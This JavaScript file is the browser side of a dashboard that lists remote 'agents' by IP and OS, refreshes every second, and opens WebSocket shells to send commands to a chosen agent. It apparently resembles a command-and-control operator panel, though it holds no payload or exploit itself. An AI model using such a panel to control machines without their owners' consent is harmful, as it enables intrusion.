let currentShellSession = null;
let currentAgentId = null;
let agentsCache = [];
let refreshTimer = null;
let isLoadingAgents = false;

function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#39;");
}

function formatDate(value) {
    if (!value) return "—";

    const date = new Date(value);
    if (Number.isNaN(date.getTime())) return String(value);
    return date.toLocaleString();
}

function buildAgentWsUrl(agentId) {
    return window.agent_ws_API.replace("/ws/0", "/ws/" + String(agentId));
}

function normalizeWsUrl(url) {
    if (!url) return null;

    if (url.startsWith("ws://") || url.startsWith("wss://")) {
        return url;
    }

    if (url.startsWith("/")) {
        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
        return `${scheme}//${window.location.host}${url}`;
    }

    return url;
}

function getShellView() {
    return document.getElementById("agent-shell-view");
}

function getShellEmpty() {
    return document.getElementById("agent-shell-empty");
}

function getShellTitle() {
    return document.getElementById("agent-shell-title");
}

function getShellMeta() {
    return document.getElementById("agent-shell-meta");
}

function getShellTerminal() {
    return document.getElementById("agent-shell-terminal");
}

function getShellInput() {
    return document.getElementById("agent-shell-input");
}

function showShellPanel() {
    const shellView = getShellView();
    const empty = getShellEmpty();

    if (shellView) shellView.hidden = false;
    if (empty) empty.hidden = true;
}

function showShellEmpty() {
    const shellView = getShellView();
    const empty = getShellEmpty();

    if (shellView) shellView.hidden = true;
    if (empty) empty.hidden = false;
}

function setShellHeader(agent) {
    const title = getShellTitle();
    const meta = getShellMeta();

    if (title) {
        title.textContent = `Agent ${agent.id} Shell`;
    }

    if (meta) {
        meta.textContent = `${agent.id ?? ""} · ${agent.ip ?? ""} · ${agent.os ?? ""}`;
    }
}

function clearShellTerminal(message = "No shell connected.") {
    const terminal = getShellTerminal();
    if (terminal) terminal.textContent = message;
}

function appendShellOutput(text) {
    const terminal = getShellTerminal();
    if (!terminal) return;

    terminal.textContent += `${terminal.textContent ? "\n" : ""}${String(text ?? "")}`;
    terminal.scrollTop = terminal.scrollHeight;
}

function closeCurrentShell() {
    if (currentShellSession?.socket) {
        try {
            currentShellSession.socket.close();
        } catch (_) {}
    }

    currentShellSession = null;
    currentAgentId = null;
    clearShellTerminal("No shell connected.");
    showShellEmpty();
}

function openShellSocket(wsUrl) {
    const normalized = normalizeWsUrl(wsUrl);
    if (!normalized) {
        appendShellOutput("[error] Missing websocket URL");
        return null;
    }

    const token = localStorage.getItem("access_jwt");
    const csrf_token = localStorage.getItem("csrf-token");
    const socket = new WebSocket(normalized);

    socket.onopen = () => {
        socket.send(JSON.stringify({ type: "auth", access_jwt: token, csrf_token }));
        appendShellOutput("[connected]");
    };

    socket.addEventListener("message", (event) => {
        appendShellOutput(event.data);
    });

    socket.addEventListener("close", () => {
        appendShellOutput("[disconnected]");
    });

    socket.addEventListener("error", () => {
        appendShellOutput("[error]");
    });

    return socket;
}

async function interactAgent(agent) {
    try {

        const response = await fetch(window.get_agent_API, {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({ id: agent.id })
        });

        const json = await response.json();

        if (!response.ok || json.result !== "success") {
            throw new Error(json.message || "Failed to get agent websocket route");
        }

        const message = json.message || {};
        const websocketUrl =
            message.websocket_url ||
            message.ws_url ||
            buildAgentWsUrl(agent.id);


        if (currentShellSession?.socket) {
            try {
                currentShellSession.socket.close();
            } catch (_) {}
        }

        currentAgentId = agent.id;
        currentShellSession = {
            agent,
            websocketUrl,
            socket: null
        };
        setShellHeader(agent);
        clearShellTerminal("Connecting...");
        showShellPanel();

        const socket = openShellSocket(websocketUrl);
        currentShellSession.socket = socket;

        await loadAgents();
    } catch (error) {
        alert(`Failed to interact with agent: ${error.message}`);
    }
}

async function deleteAgent(agentId) {
    const confirmed = window.confirm(`Delete agent ${agentId}?`);
    if (!confirmed) return;

    try {
        const response = await fetch(window.delete_agent_API, {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({ id: agentId })
        });

        const json = await response.json();

        if (!response.ok || json.result !== "success") {
            throw new Error(json.message || "Failed to delete agent");
        }

        if (String(currentAgentId) === String(agentId)) {
            closeCurrentShell();
        }

        await loadAgents();
    } catch (error) {
        alert(`Failed to delete agent: ${error.message}`);
    }
}

async function loadAgents() {
    if (isLoadingAgents) return;
    isLoadingAgents = true;

    const tbody = document.getElementById("agents-tbody");
    const empty = document.getElementById("agents-empty");

    if (!tbody) {
        isLoadingAgents = false;
        return;
    }

    try {
        const response = await fetch(window.list_agents_API, {
            method: "GET",
            credentials: "include",
            headers: {
                "Accept": "application/json"
            }
        });

        const json = await response.json();

        if (!response.ok || json.result !== "success") {
            throw new Error(json.message || "Failed to load agents");
        }

        const agents = Array.isArray(json.message) ? json.message : [];
        agentsCache = agents;

        if (currentAgentId && !agents.some((a) => String(a.id) === String(currentAgentId))) {
            closeCurrentShell();
        }

        if (!agents.length) {
            tbody.innerHTML = "";
            if (empty) empty.classList.remove("hidden");
            return;
        } else if (empty) {
            empty.classList.add("hidden");
        }

        tbody.innerHTML = agents.map((agent) => `
            <tr>
                <td>${escapeHtml(agent.id)}</td>
                <td>${escapeHtml(agent.ip)}</td>
                <td>${escapeHtml(agent.os)}</td>
                <td>${escapeHtml(formatDate(agent.last_seen))}</td>
                <td>
                    <div class="actions">
                        <button class="btn primary" data-interact="${escapeHtml(agent.id)}">Interact</button>
                        <button class="btn warn" data-delete="${escapeHtml(agent.id)}">Delete</button>
                    </div>
                </td>
            </tr>
        `).join("");

        tbody.querySelectorAll("[data-interact]").forEach((button) => {
            button.addEventListener("click", () => {
                const agentId = button.dataset.interact;
                const agent = agents.find((item) => String(item.id) === String(agentId));
                if (agent) interactAgent(agent);
            });
        });

        tbody.querySelectorAll("[data-delete]").forEach((button) => {
            button.addEventListener("click", () => {
                deleteAgent(button.dataset.delete);
            });
        });

        if (currentShellSession) {
            const updatedAgent = agents.find((a) => String(a.id) === String(currentAgentId));
            if (updatedAgent) {
                currentShellSession.agent = updatedAgent;
                setShellHeader(updatedAgent, currentShellSession.shell?.id ?? null);
            }
        }
    } catch (error) {
        tbody.innerHTML = `
            <tr>
                <td colspan="5" class="error">Failed to load agents: ${escapeHtml(error.message)}</td>
            </tr>
        `;
    } finally {
        isLoadingAgents = false;
    }
}

function startAutoRefresh() {
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = setInterval(() => {
        loadAgents();
    }, 1000);
}

document.addEventListener("DOMContentLoaded", async () => {
    const input = getShellInput();
    const endBtn = document.getElementById("end-agent-shell-btn");

    if (input) {
        input.addEventListener("keydown", (event) => {
            if (event.key !== "Enter") return;

            const command = input.value.trim();
            if (!command) return;

            const socket = currentShellSession?.socket;
            if (!socket || socket.readyState !== WebSocket.OPEN) return;

            socket.send(command);
            appendShellOutput(`$ ${command}`);
            input.value = "";
        });
    }

    if (endBtn) {
        endBtn.addEventListener("click", () => {
            closeCurrentShell();
        });
    }

    showShellEmpty();
    await loadAgents();
    startAutoRefresh();
});